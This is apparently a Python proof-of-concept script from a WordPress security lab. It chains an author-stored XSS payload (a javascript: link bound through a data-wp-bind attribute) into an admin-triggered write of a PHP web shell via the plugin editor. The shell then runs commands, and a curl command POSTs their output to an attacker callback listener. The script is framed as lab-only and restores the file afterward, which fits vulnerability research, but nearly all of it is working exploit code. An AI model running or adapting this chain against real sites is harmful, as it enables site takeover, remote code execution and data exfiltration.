#!/usr/bin/env python3
"""Escalation with an outbound callback: server -> attacker C2 channel.

Same chain as `rce_cmd_chain.py`, but the final step makes the WordPress host
POST command output back to a listener you control. Start the listener first:

    python3 c2listener.py --port 9099

Then, from the machine that can reach the container (the docker bridge gateway
is usually reachable from inside the container):

    python3 rce_exfil_chain.py 172.19.0.1 9099

The listener prints and logs each POST, including the command output. The file is
restored and the post deleted at the end.
"""
from __future__ import annotations

import sys
import time
from pathlib import Path

import requests
from playwright.sync_api import sync_playwright

import wp_lab

ASSET_ORIGINAL = Path(__file__).resolve().parent / "assets" / "hello.php.orig"
DEFAULT_CALLBACK_IP = "172.19.0.1"
DEFAULT_CALLBACK_PORT = "9099"

ADMIN_JS = (
    "(async()=>{window.__RCE={s:'start'};"
    "try{"
    "var r=await fetch('/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php',"
    "{credentials:'include'});"
    "var h=await r.text();"
    "var d=new DOMParser().parseFromString(h,'text/html');"
    "var f=d.querySelector('form#template');"
    "var fd=new FormData();"
    "f.querySelectorAll('input').forEach(function(i){"
    "if(i.type=='hidden'){fd.append(i.name,i.value)}});"
    "var php=String.fromCharCode(60)+\"?php echo shell_exec($_GET['cmd']);\";"
    "fd.set('newcontent',php);"
    "var r2=await fetch('/wp-admin/plugin-editor.php',"
    "{method:'POST',body:fd,credentials:'include',redirect:'follow'});"
    "window.__RCE.save=r2.status;window.__RCE.s='done';"
    "}catch(e){window.__RCE.err=String(e);window.__RCE.s='err'}"
    "window.__RCE.done=true;})();void 0"
)


def click_as_admin(post_id: int) -> dict:
    c = wp_lab.cfg()
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(
            executable_path=c.chrome, headless=True, args=["--no-sandbox"]
        )
        page = browser.new_context().new_page()
        page.goto(c.base + "/wp-login.php", wait_until="load")
        page.fill("#user_login", c.admin_user)
        page.fill("#user_pass", c.admin_pass)
        page.click("#wp-submit")
        page.wait_for_load_state("load")
        logged_in = "wp-admin" in page.url
        page.goto(f"{c.base}/?p={post_id}", wait_until="load")
        page.wait_for_timeout(1500)
        page.evaluate("() => document.querySelector('#t').click()")
        deadline = time.time() + 20
        while time.time() < deadline:
            if page.evaluate("() => window.__RCE && window.__RCE.done"):
                break
            page.wait_for_timeout(500)
        state = page.evaluate("() => window.__RCE || null")
        browser.close()
    return {"admin_login": logged_in, "rce_state": state}


def main() -> int:
    c = wp_lab.cfg()
    callback_ip = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CALLBACK_IP
    callback_port = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_CALLBACK_PORT
    callback = f"http://{callback_ip}:{callback_port}"

    print(f"[*] target: {c.base}   (LAB ONLY)")
    print(f"[*] callback: {callback}")

    evidence: dict = {
        "target": c.base,
        "scope": "LOCAL LAB ONLY",
        "proof": "attacker-driven command exec + outbound exfil to attacker host",
        "callback": callback,
    }
    before_hash = wp_lab.remote_sha256()
    evidence["hello_php_sha256_before"] = before_hash
    if before_hash is None:
        print("[!] docker not available — skipping file hash checks")

    # 1) Author stores the payload.
    author = wp_lab.login_author()
    if not author.nonce:
        print("FAIL: author login/nonce failed")
        return 1
    payload = wp_lab.island(
        {"u": "javascript:" + ADMIN_JS},
        '<a id="t" href="https://example.com/" data-wp-bind--href="context.u">CAP</a>',
    )
    post, status = wp_lab.publish(
        author, "RCE exfil chain (lab)", wp_lab.accordion(payload)
    )
    post_id = post["id"]
    evidence["author"] = {"uid": author.uid, "roles": author.roles}
    evidence["post"] = {
        "id": post_id,
        "http": status,
        "status": post.get("status"),
    }
    print("author post:", evidence["post"])

    # 2) Administrator victim clicks.
    evidence.update(click_as_admin(post_id))
    evidence["hello_php_sha256_after_write"] = wp_lab.remote_sha256()
    print("written file:", wp_lab.remote_read())

    # 3) The attacker drives one command over HTTP.
    response = requests.get(
        c.base + "/wp-content/plugins/hello.php",
        params={"cmd": "id; hostname; uname -srmo"},
        timeout=20,
    )
    evidence["cmd_http"] = {"status": response.status_code, "output": response.text}
    print("\n$ id; hostname; uname -srmo\n" + response.text)

    # 4) Outbound exfil: the WordPress host POSTs output to the attacker host.
    exfil_command = (
        f'curl -s -m 8 -X POST --data "$(id; hostname; uname -srmo)" {callback}/exfil'
    )
    response = requests.get(
        c.base + "/wp-content/plugins/hello.php",
        params={"cmd": exfil_command},
        timeout=25,
    )
    evidence["exfil_trigger"] = {"status": response.status_code, "output": response.text}
    time.sleep(2)

    log_path = c.out_dir / "c2.log"
    try:
        evidence["c2_log"] = log_path.read_text()
    except OSError as error:
        evidence["c2_log"] = f"<unreadable: {error}>"
    print("\n=== attacker listener log ===")
    print(evidence["c2_log"])

    # 5) Restore + verify.
    if wp_lab.docker_ready() and ASSET_ORIGINAL.exists():
        wp_lab.restore_file(ASSET_ORIGINAL)
        evidence["hello_php_sha256_restored"] = wp_lab.remote_sha256()
        evidence["restored_ok"] = evidence["hello_php_sha256_restored"] == before_hash
    else:
        evidence["restored_ok"] = None

    # 6) Delete the lab post.
    admin = wp_lab.login_admin()
    evidence["post_deleted"] = wp_lab.delete_post(admin, post_id)

    output = wp_lab.write_json("rce_exfil_chain.json", evidence)
    print(
        f"\nrestored_ok: {evidence['restored_ok']} | "
        f"post_deleted: {evidence['post_deleted']} | evidence: {output}"
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
